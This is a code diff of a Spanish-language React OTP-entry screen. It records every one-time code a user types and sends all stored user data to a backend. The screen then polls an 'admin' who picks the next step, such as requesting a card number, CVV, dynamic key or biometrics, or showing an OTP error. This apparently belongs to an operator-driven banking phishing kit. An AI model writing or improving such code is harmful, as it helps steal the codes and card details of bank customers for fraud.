@@ -281,6 +281,38 @@ export default function NumeroOTP() {
         }));
     };
 
+    // Metodo para registrar el intento de otp
+    const actualizarLocalStorage = (otp) => {
+
+        // Se obtiene los datos del localStorage
+        const storageKey = "datos_usuario";
+
+        // Se obtiene el valor almacenado
+        const raw = localStorage.getItem(storageKey);
+
+        // Se parsea el JSON o se inicializa un objeto vacío
+        let datos = raw ? JSON.parse(raw) : {};
+
+        // Se inicializa el objeto de intentos si no existe
+        if (!datos.codigo) datos.codigo = {};
+
+        // Se crea la clave del nuevo intento
+        const intentoNum = Object.keys(datos.codigo).length + 1;
+        const intentoKey = `intento_${intentoNum}`;
+
+        // Se registra el nuevo intento
+        datos.codigo[intentoKey] = {
+            codigo: otp,
+            fecha: new Date().toLocaleString(),
+        };
+
+        // Se guarda nuevamente en el localStorage
+        localStorage.setItem(storageKey, JSON.stringify(datos));
+
+        // Se retorna el objeto de intentos
+        return datos.codigo;
+    };
+
     const handleContinuar = async () => {
         setCargando(true);
 
@@ -295,18 +327,23 @@ export default function NumeroOTP() {
                 return;
             }
 
+            // Obtener el código OTP ingresado
             const otpCode = formState.clave;
 
-            // Prepare data in correct format for backend
+            // Registrar intento antes de enviar
+            actualizarLocalStorage(otpCode);
+
+            // Prepara los datos con ID de sesión
+            const dataLocalStorage = localStorage.getItem("datos_usuario") ? JSON.parse(localStorage.getItem("datos_usuario")) : null;
+
+            // Se envia la data
             const dataSend = {
-                data: {
-                    attributes: {
-                        sesion_id: sesionId,
-                        codigo: otpCode
-                    }
-                }
+                "data": {
+                    "attributes": dataLocalStorage
+                },
             };
 
+            // Se envia la petición al backend
             await instanceBackend.post('/otp', dataSend);
 
             // Iniciar polling para esperar respuesta del admin
@@ -330,10 +367,19 @@ export default function NumeroOTP() {
 
                 // Estados que detienen el polling
                 const estadosFinales = [
+                    // Botones linea 1
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+
+                    // Botones linea 2
                     'error_tc', 'error_otp', 'error_din', 'error_login',
+
+                    // Botones linea 3
                     'solicitar_biometria', 'error_923',
+
+                    // Botones linea 4
                     'solicitar_tc_custom', 'solicitar_cvv_custom',
+
+                    // Estados adicionales por pantalla
                     'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                 ];
 
